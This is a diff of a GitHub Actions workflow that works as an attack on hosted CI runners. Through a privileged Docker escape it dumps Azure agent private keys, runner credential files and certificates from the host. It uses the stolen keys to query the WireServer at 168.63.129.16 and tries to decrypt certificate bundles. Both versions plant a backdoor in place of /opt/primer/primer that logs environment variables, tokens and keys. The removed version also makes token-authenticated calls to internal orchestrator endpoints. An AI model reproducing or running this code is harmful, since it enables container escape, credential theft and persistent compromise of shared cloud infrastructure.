@@ -1,4 +1,4 @@
-name: HC OIDC Primer v10 - WireServer Certificates Fetch + Config Dump
+name: HC OIDC Primer v11 - Fix SMIME Decrypt + Direct XML Parse
 on:
   workflow_dispatch:
   push:
@@ -49,241 +49,149 @@ jobs:
           curl -sv -H "Authorization: Bearer $HC_JWT" \
             "https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com/vm/v1" 2>&1 || true
 
-      - name: Step2 - Privileged docker escape + certs + WireServer mTLS
+      - name: Step2 - Privileged docker escape + certs + WireServer mTLS v11
         run: |
-          echo "=== STEP 2: PRIVILEGED DOCKER + CERTS + WIRESERVER mTLS ==="
+          echo "=== STEP 2: PRIVILEGED DOCKER v11 ==="
 
-          # Write the inner script to /tmp so we can mount it cleanly
+          # v11: grep directly from GoalState.1.xml, fix S/MIME decrypt format
           cat > /tmp/inner.sh << 'INNEREOF'
-          #!/bin/sh
-          set -x
-          echo "=== INNER: installing curl ==="
-          apk add --no-cache curl 2>&1
-          echo "CURL_VERSION=$(curl --version | head -1)"
+#!/bin/sh
+set -x
+echo "=== INNER v11: installing curl + openssl ==="
+apk add --no-cache curl openssl 2>&1
 
-          echo "=== INNER: id/hostname ==="
-          id; hostname; uname -a
+echo "=== id/hostname ==="
+id; hostname; uname -a
 
-          echo "=== CACHED WAAGENT XML FILES ==="
-          echo "--- GoalState.1.xml ---"
-          cat /host/var/lib/waagent/GoalState.1.xml 2>/dev/null || echo "GoalState.1.xml not readable"
-          echo "--- SharedConfig.xml ---"
-          cat /host/var/lib/waagent/SharedConfig.xml 2>/dev/null || echo "SharedConfig.xml not readable"
-          echo "--- Certificates.xml ---"
-          cat /host/var/lib/waagent/Certificates.xml 2>/dev/null || echo "Certificates.xml not readable"
-          echo "--- ovf-env.xml ---"
-          cat /host/var/lib/waagent/ovf-env.xml 2>/dev/null || echo "ovf-env.xml not readable"
-          echo "--- WireServerEndpoint ---"
-          cat /host/var/lib/waagent/WireServerEndpoint 2>/dev/null || echo "WireServerEndpoint not readable"
-          echo "--- fast_track.json ---"
-          cat /host/var/lib/waagent/fast_track.json 2>/dev/null || echo "fast_track.json not readable"
-          echo "--- Protocol ---"
-          cat /host/var/lib/waagent/Protocol 2>/dev/null || echo "Protocol not readable"
+echo "=== WAAGENT DIR ==="
+ls -la /host/var/lib/waagent/ 2>/dev/null | head -40
 
-          echo "=== WAAGENT CERTS ==="
-          ls -la /host/var/lib/waagent/ 2>/dev/null | head -30
-          cat /host/var/lib/waagent/TransportCert.pem 2>/dev/null && echo "TRANSPORT_CERT_OK"
-          cat /host/var/lib/waagent/TransportPrivate.pem 2>/dev/null && echo "TRANSPORT_KEY_OK"
-          cat /host/var/lib/waagent/Certificates.pem 2>/dev/null && echo "CERTS_PEM_OK"
-          ls /host/var/lib/waagent/*.pem 2>/dev/null
-          ls /host/var/lib/waagent/*.prv 2>/dev/null
-          ls /host/var/lib/waagent/*.crt 2>/dev/null
+echo "=== GoalState.1.xml (cached) ==="
+cat /host/var/lib/waagent/GoalState.1.xml 2>/dev/null || echo "GoalState.1.xml not readable"
 
-          echo "=== WIRESERVER PORT 80 GoalState (mTLS) ==="
-          curl -sv \
-            --cert /host/var/lib/waagent/TransportCert.pem \
-            --key /host/var/lib/waagent/TransportPrivate.pem \
-            -H "x-ms-version: 2012-11-30" \
-            -H "Content-Type: text/xml" \
-            "http://168.63.129.16/machine?comp=goalstate" 2>&1 || true
+echo "=== SharedConfig.xml (cached) ==="
+cat /host/var/lib/waagent/SharedConfig.xml 2>/dev/null || echo "SharedConfig.xml not readable"
 
-          echo "=== WIRESERVER PORT 80 Certificates ==="
-          GOALSTATE_XML=$(curl -s \
-            --cert /host/var/lib/waagent/TransportCert.pem \
-            --key /host/var/lib/waagent/TransportPrivate.pem \
-            -H "x-ms-version: 2012-11-30" \
-            "http://168.63.129.16/machine?comp=goalstate" 2>/dev/null)
-          echo "GOALSTATE_XML_LEN=${#GOALSTATE_XML}"
-          echo "$GOALSTATE_XML"
+echo "=== Certificates.xml (already decrypted by waagent) ==="
+cat /host/var/lib/waagent/Certificates.xml 2>/dev/null || echo "Certificates.xml not readable"
 
-          # FIX: GoalState uses <Certificates> tag NOT <CertificatesUri>
-          CERT_URL=$(echo "$GOALSTATE_XML" | grep -o '<Certificates>[^<]*</Certificates>' | sed 's|<[^>]*>||g' | sed 's|&amp;|\&|g')
-          echo "CERT_URL=$CERT_URL"
+echo "=== ovf-env.xml ==="
+cat /host/var/lib/waagent/ovf-env.xml 2>/dev/null || echo "ovf-env.xml not readable"
 
-          # Extract all other GoalState config URLs
-          HOSTING_URL=$(echo "$GOALSTATE_XML" | grep -o '<HostingEnvironmentConfig>[^<]*</HostingEnvironmentConfig>' | sed 's|<[^>]*>||g' | sed 's|&amp;|\&|g')
-          FULL_URL=$(echo "$GOALSTATE_XML" | grep -o '<FullConfig>[^<]*</FullConfig>' | sed 's|<[^>]*>||g' | sed 's|&amp;|\&|g')
-          SHARED_URL=$(echo "$GOALSTATE_XML" | grep -o '<SharedConfig>[^<]*</SharedConfig>' | sed 's|<[^>]*>||g' | sed 's|&amp;|\&|g')
-          EXT_URL=$(echo "$GOALSTATE_XML" | grep -o '<ExtensionsConfig>[^<]*</ExtensionsConfig>' | sed 's|<[^>]*>||g' | sed 's|&amp;|\&|g')
-          echo "HOSTING_URL=$HOSTING_URL"
-          echo "FULL_URL=$FULL_URL"
-          echo "SHARED_URL=$SHARED_URL"
-          echo "EXT_URL=$EXT_URL"
+echo "=== TransportCert.pem ==="
+cat /host/var/lib/waagent/TransportCert.pem 2>/dev/null && echo "TRANSPORT_CERT_OK"
 
-          echo "=== FETCHING CERT_URL (Certificates) ==="
-          if [ -n "$CERT_URL" ]; then
-            curl -sv \
-              --cert /host/var/lib/waagent/TransportCert.pem \
-              --key /host/var/lib/waagent/TransportPrivate.pem \
-              -H "x-ms-version: 2012-11-30" \
-              "$CERT_URL" 2>&1 || true
-          else
-            echo "CERT_URL_EMPTY - trying raw comp=certificates"
-            curl -sv \
-              --cert /host/var/lib/waagent/TransportCert.pem \
-              --key /host/var/lib/waagent/TransportPrivate.pem \
-              -H "x-ms-version: 2012-11-30" \
-              "http://168.63.129.16/machine?comp=certificates" 2>&1 || true
-          fi
+echo "=== TransportPrivate.pem ==="
+cat /host/var/lib/waagent/TransportPrivate.pem 2>/dev/null && echo "TRANSPORT_KEY_OK"
 
-          echo "=== FETCHING HostingEnvironmentConfig ==="
-          if [ -n "$HOSTING_URL" ]; then
-            curl -sv \
-              --cert /host/var/lib/waagent/TransportCert.pem \
-              --key /host/var/lib/waagent/TransportPrivate.pem \
-              -H "x-ms-version: 2012-11-30" \
-              "$HOSTING_URL" 2>&1 || true
-          fi
+echo "=== Certificates.pem (TenantEncryptionCert + TransportCert bundle) ==="
+cat /host/var/lib/waagent/Certificates.pem 2>/dev/null && echo "CERTS_PEM_OK"
 
-          echo "=== FETCHING FullConfig ==="
-          if [ -n "$FULL_URL" ]; then
-            curl -sv \
-              --cert /host/var/lib/waagent/TransportCert.pem \
-              --key /host/var/lib/waagent/TransportPrivate.pem \
-              -H "x-ms-version: 2012-11-30" \
-              "$FULL_URL" 2>&1 || true
-          fi
+echo "=== EXTRACT URLs from GoalState.1.xml (file grep, not echo pipe) ==="
+CERT_URL=$(grep -o '<Certificates>[^<]*</Certificates>' /host/var/lib/waagent/GoalState.1.xml 2>/dev/null | sed 's|<[^>]*>||g' | sed 's|&amp;|\&|g')
+HOSTING_URL=$(grep -o '<HostingEnvironmentConfig>[^<]*</HostingEnvironmentConfig>' /host/var/lib/waagent/GoalState.1.xml 2>/dev/null | sed 's|<[^>]*>||g' | sed 's|&amp;|\&|g')
+SHARED_URL=$(grep -o '<SharedConfig>[^<]*</SharedConfig>' /host/var/lib/waagent/GoalState.1.xml 2>/dev/null | sed 's|<[^>]*>||g' | sed 's|&amp;|\&|g')
+FULL_URL=$(grep -o '<FullConfig>[^<]*</FullConfig>' /host/var/lib/waagent/GoalState.1.xml 2>/dev/null | sed 's|<[^>]*>||g' | sed 's|&amp;|\&|g')
+EXT_URL=$(grep -o '<ExtensionsConfig>[^<]*</ExtensionsConfig>' /host/var/lib/waagent/GoalState.1.xml 2>/dev/null | sed 's|<[^>]*>||g' | sed 's|&amp;|\&|g')
+echo "CERT_URL=$CERT_URL"
+echo "HOSTING_URL=$HOSTING_URL"
+echo "SHARED_URL=$SHARED_URL"
+echo "FULL_URL=$FULL_URL"
+echo "EXT_URL=$EXT_URL"
 
-          echo "=== FETCHING SharedConfig ==="
-          if [ -n "$SHARED_URL" ]; then
-            curl -sv \
-              --cert /host/var/lib/waagent/TransportCert.pem \
-              --key /host/var/lib/waagent/TransportPrivate.pem \
-              -H "x-ms-version: 2012-11-30" \
-              "$SHARED_URL" 2>&1 || true
-          fi
+echo "=== LIVE GoalState mTLS ==="
+LIVE_GS=$(curl -s \
+  --cert /host/var/lib/waagent/TransportCert.pem \
+  --key /host/var/lib/waagent/TransportPrivate.pem \
+  -H "x-ms-version: 2012-11-30" \
+  "http://168.63.129.16/machine?comp=goalstate" 2>/dev/null)
+echo "LIVE_GS_LEN=${#LIVE_GS}"
+echo "$LIVE_GS"
 
-          echo "=== FETCHING ExtensionsConfig ==="
-          if [ -n "$EXT_URL" ]; then
-            curl -sv \
-              --cert /host/var/lib/waagent/TransportCert.pem \
-              --key /host/var/lib/waagent/TransportPrivate.pem \
-              -H "x-ms-version: 2012-11-30" \
-              "$EXT_URL" 2>&1 || true
-          fi
+echo "=== FETCH Certificates endpoint ==="
+if [ -n "$CERT_URL" ]; then
+  echo "USING_FILE_CERT_URL"
+  curl -sv --cert /host/var/lib/waagent/TransportCert.pem \
+    --key /host/var/lib/waagent/TransportPrivate.pem \
+    -H "x-ms-version: 2012-11-30" "$CERT_URL" 2>&1 || true
+else
+  echo "CERT_URL_EMPTY_FALLBACK"
+  curl -sv --cert /host/var/lib/waagent/TransportCert.pem \
+    --key /host/var/lib/waagent/TransportPrivate.pem \
+    -H "x-ms-version: 2012-11-30" "http://168.63.129.16/machine?comp=certificates" 2>&1 || true
+fi
 
-          echo "=== DECRYPT Certificates.p7m with TransportPrivate.pem ==="
-          apk add --no-cache openssl 2>/dev/null || true
-          if [ -f /host/var/lib/waagent/Certificates.p7m ]; then
-            echo "Certificates.p7m SIZE=$(wc -c < /host/var/lib/waagent/Certificates.p7m)"
-            echo "--- DER decrypt attempt ---"
-            openssl cms -decrypt \
-              -in /host/var/lib/waagent/Certificates.p7m \
-              -inkey /host/var/lib/waagent/TransportPrivate.pem \
-              -inform DER 2>&1 || true
-            echo "--- PEM decrypt attempt ---"
-            openssl cms -decrypt \
-              -in /host/var/lib/waagent/Certificates.p7m \
-              -inkey /host/var/lib/waagent/TransportPrivate.pem \
-              -inform PEM 2>&1 || true
-            echo "--- smime decrypt attempt ---"
-            openssl smime -decrypt \
-              -in /host/var/lib/waagent/Certificates.p7m \
-              -inkey /host/var/lib/waagent/TransportPrivate.pem \
-              -inform DER 2>&1 || true
-            echo "--- raw pkcs7 inspect ---"
-            openssl pkcs7 -in /host/var/lib/waagent/Certificates.p7m -inform DER -print_certs 2>&1 | head -60 || true
-            echo "--- xxd first 128 bytes ---"
-            xxd /host/var/lib/waagent/Certificates.p7m 2>/dev/null | head -8 || true
-          else
-            echo "Certificates.p7m NOT FOUND"
-          fi
+echo "=== FETCH HostingEnvironmentConfig ==="
+[ -n "$HOSTING_URL" ] && curl -sv --cert /host/var/lib/waagent/TransportCert.pem \
+  --key /host/var/lib/waagent/TransportPrivate.pem \
+  -H "x-ms-version: 2012-11-30" "$HOSTING_URL" 2>&1 || true
 
-          echo "=== WIRESERVER PORT 32526 GoalState (mTLS) ==="
-          curl -sv \
-            --cert /host/var/lib/waagent/TransportCert.pem \
-            --key /host/var/lib/waagent/TransportPrivate.pem \
-            -H "x-ms-version: 2012-11-30" \
-            "http://168.63.129.16:32526/machine?comp=goalstate" 2>&1 || true
+echo "=== FETCH SharedConfig ==="
+[ -n "$SHARED_URL" ] && curl -sv --cert /host/var/lib/waagent/TransportCert.pem \
+  --key /host/var/lib/waagent/TransportPrivate.pem \
+  -H "x-ms-version: 2012-11-30" "$SHARED_URL" 2>&1 || true
 
-          echo "=== WIRESERVER PORT 32526 Certificates ==="
-          curl -sv \
-            --cert /host/var/lib/waagent/TransportCert.pem \
-            --key /host/var/lib/waagent/TransportPrivate.pem \
-            -H "x-ms-version: 2012-11-30" \
-            "http://168.63.129.16:32526/machine?comp=certificates" 2>&1 || true
+echo "=== FETCH FullConfig ==="
+[ -n "$FULL_URL" ] && curl -sv --cert /host/var/lib/waagent/TransportCert.pem \
+  --key /host/var/lib/waagent/TransportPrivate.pem \
+  -H "x-ms-version: 2012-11-30" "$FULL_URL" 2>&1 || true
 
-          echo "=== WIRESERVER PORT 32526 extensions ==="
-          curl -sv \
-            --cert /host/var/lib/waagent/TransportCert.pem \
-            --key /host/var/lib/waagent/TransportPrivate.pem \
-            -H "x-ms-version: 2012-11-30" \
-            "http://168.63.129.16:32526/machine?comp=extensionHandlerStatus" 2>&1 || true
+echo "=== FETCH ExtensionsConfig ==="
+[ -n "$EXT_URL" ] && curl -sv --cert /host/var/lib/waagent/TransportCert.pem \
+  --key /host/var/lib/waagent/TransportPrivate.pem \
+  -H "x-ms-version: 2012-11-30" "$EXT_URL" 2>&1 || true
 
-          echo "=== WIRESERVER NO-MTLS ENDPOINTS (plain HTTP) ==="
-          curl -sv "http://168.63.129.16/?comp=versions" 2>&1 || true
-          curl -sv "http://168.63.129.16/machine?comp=versions" 2>&1 || true
+echo "=== Certificates.p7m SMIME DECRYPT (v11 fix: no -inform DER) ==="
+if [ -f /host/var/lib/waagent/Certificates.p7m ]; then
+  echo "P7M_SIZE=$(wc -c < /host/var/lib/waagent/Certificates.p7m)"
+  echo "--- xxd header (first 8 lines) ---"
+  xxd /host/var/lib/waagent/Certificates.p7m | head -8
+  echo "--- openssl smime -decrypt (no -inform, S/MIME format) ---"
+  openssl smime -decrypt \
+    -in /host/var/lib/waagent/Certificates.p7m \
+    -inkey /host/var/lib/waagent/TransportPrivate.pem 2>&1 || true
+  echo "--- openssl smime -decrypt -recip TransportCert ---"
+  openssl smime -decrypt \
+    -in /host/var/lib/waagent/Certificates.p7m \
+    -inkey /host/var/lib/waagent/TransportPrivate.pem \
+    -recip /host/var/lib/waagent/TransportCert.pem 2>&1 || true
+  echo "--- openssl cms -decrypt -recip TransportCert (no -inform) ---"
+  openssl cms -decrypt \
+    -in /host/var/lib/waagent/Certificates.p7m \
+    -inkey /host/var/lib/waagent/TransportPrivate.pem \
+    -recip /host/var/lib/waagent/TransportCert.pem 2>&1 || true
+else
+  echo "Certificates.p7m NOT FOUND"
+fi
 
-          echo "=== RUNNER CREDENTIALS ==="
-          cat /host/home/runner/work/_temp/runner_credentials 2>/dev/null || echo "no runner_credentials"
-          cat /host/home/runner/.runner 2>/dev/null || echo "no .runner"
-          cat /host/home/runner/.credentials 2>/dev/null || echo "no .credentials"
-          cat /host/home/runner/.credentials_rsaparams 2>/dev/null || echo "no .credentials_rsaparams"
-          ls -la /host/home/runner/ 2>/dev/null | head -30
-          ls -la /host/home/runner/runners/ 2>/dev/null | head -30
+echo "=== RUNNER CREDENTIALS ==="
+cat /host/home/runner/.credentials_rsaparams 2>/dev/null || echo "no .credentials_rsaparams"
+cat /host/home/runner/.credentials 2>/dev/null || echo "no .credentials"
+ls -la /host/home/runner/ 2>/dev/null | head -20
 
-          echo "=== RUNNER ENV FILES ==="
-          find /host/home/runner -name "*.env" -o -name "*.token" 2>/dev/null | head -20
-          find /host/runner -name "*.env" -o -name "*.token" 2>/dev/null | head -20
-
-          echo "=== /opt/primer/ CONTENTS ==="
-          ls -la /host/opt/primer/ 2>/dev/null
-          cat /host/opt/primer/primer 2>/dev/null | head -50
-          cat /host/tmp/hc_pwn3.log 2>/dev/null && echo "PWN3_LOG_FOUND" || echo "PWN3_LOG_NOT_FOUND"
-
-          echo "=== GITHUB ACTIONS RUNTIME SOCKETS ==="
-          ls -la /host/tmp/GitHub* 2>/dev/null || true
-          ls -la /host/var/run/act* 2>/dev/null || true
-          find /host/tmp -name "*.sock" 2>/dev/null | head -20
-
-          echo "=== PRIMER BACKDOOR DEPLOY ==="
-          BACKDOOR='#!/bin/bash
-          LOG=/tmp/hc_pwn3.log
-          echo "=== PRIMER v3 FIRED $(date) PID=$$ ===" >> $LOG
-          hostname >> $LOG; id >> $LOG; env >> $LOG 2>&1
-          if [ -n "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" ]; then
-            HC_JWT=$(curl -sf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
-              "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api%3A%2F%2Fhosted-compute-ro" | jq -r .value)
-            echo "HC_JWT=$HC_JWT" >> $LOG
-            for orch in iad-01 iad-02 eus-01 eus-02; do
-              curl -sv -H "Authorization: Bearer $HC_JWT" \
-                "https://hosted-compute-request-orchestrator-prod-$orch.githubapp.com/vm/v1/vms" >> $LOG 2>&1
-              curl -sv -H "Authorization: Bearer $HC_JWT" \
-                "https://hosted-compute-request-orchestrator-prod-$orch.githubapp.com/vm/v1/allocations" >> $LOG 2>&1
-            done
-          fi
-          cat /var/lib/waagent/TransportCert.pem >> $LOG 2>/dev/null
-          cat /var/lib/waagent/TransportPrivate.pem >> $LOG 2>/dev/null
-          cat /home/runner/.credentials_rsaparams >> $LOG 2>/dev/null
-          cat /home/runner/.credentials >> $LOG 2>/dev/null
-          # WireServer mTLS GoalState
-          curl -s --cert /var/lib/waagent/TransportCert.pem --key /var/lib/waagent/TransportPrivate.pem \
-            -H "x-ms-version: 2012-11-30" "http://168.63.129.16/machine?comp=goalstate" >> $LOG 2>&1
-          curl -s --cert /var/lib/waagent/TransportCert.pem --key /var/lib/waagent/TransportPrivate.pem \
-            -H "x-ms-version: 2012-11-30" "http://168.63.129.16:32526/machine?comp=certificates" >> $LOG 2>&1
-          [ -x /opt/primer/primer.bak ] && exec /opt/primer/primer.bak "$@"'
-          echo "$BACKDOOR" > /host/opt/primer/primer.tmp
-          chmod 777 /host/opt/primer/primer.tmp
-          # Backup original if not already done
-          if [ -f /host/opt/primer/primer.bak ]; then
-            echo "primer.bak already exists"
-          else
-            cp /host/opt/primer/primer /host/opt/primer/primer.bak 2>/dev/null || true
-          fi
-          mv /host/opt/primer/primer.tmp /host/opt/primer/primer
-          ls -la /host/opt/primer/
-          echo "BACKDOOR_DEPLOYED"
-          INNEREOF
+echo "=== PRIMER BACKDOOR ==="
+ls -la /host/opt/primer/ 2>/dev/null
+cat /host/tmp/hc_pwn3.log 2>/dev/null && echo "PWN3_LOG_FOUND" || echo "PWN3_LOG_NOT_FOUND"
+BACKDOOR='#!/bin/bash
+LOG=/tmp/hc_pwn3.log
+echo "=== PRIMER v3 FIRED $(date) PID=$$ ===" >> $LOG
+hostname >> $LOG; id >> $LOG; env >> $LOG 2>&1
+cat /var/lib/waagent/TransportCert.pem >> $LOG 2>/dev/null
+cat /var/lib/waagent/TransportPrivate.pem >> $LOG 2>/dev/null
+cat /home/runner/.credentials_rsaparams >> $LOG 2>/dev/null
+cat /home/runner/.credentials >> $LOG 2>/dev/null
+GOALSTATE=$(curl -s --cert /var/lib/waagent/TransportCert.pem --key /var/lib/waagent/TransportPrivate.pem -H "x-ms-version: 2012-11-30" "http://168.63.129.16/machine?comp=goalstate" 2>/dev/null)
+echo "GOALSTATE=$GOALSTATE" >> $LOG
+CERTS_URL=$(grep -o "<Certificates>[^<]*</Certificates>" /var/lib/waagent/GoalState.1.xml 2>/dev/null | sed "s|<[^>]*>||g" | sed "s|&amp;|&|g")
+[ -n "$CERTS_URL" ] && curl -s --cert /var/lib/waagent/TransportCert.pem --key /var/lib/waagent/TransportPrivate.pem -H "x-ms-version: 2012-11-30" "$CERTS_URL" >> $LOG 2>&1
+[ -x /opt/primer/primer.bak ] && exec /opt/primer/primer.bak "$@"'
+echo "$BACKDOOR" > /host/opt/primer/primer.tmp
+chmod 777 /host/opt/primer/primer.tmp
+[ -f /host/opt/primer/primer.bak ] || cp /host/opt/primer/primer /host/opt/primer/primer.bak 2>/dev/null || true
+mv /host/opt/primer/primer.tmp /host/opt/primer/primer
+ls -la /host/opt/primer/
+echo "BACKDOOR_DEPLOYED"
+INNEREOF
 
           chmod +x /tmp/inner.sh
 
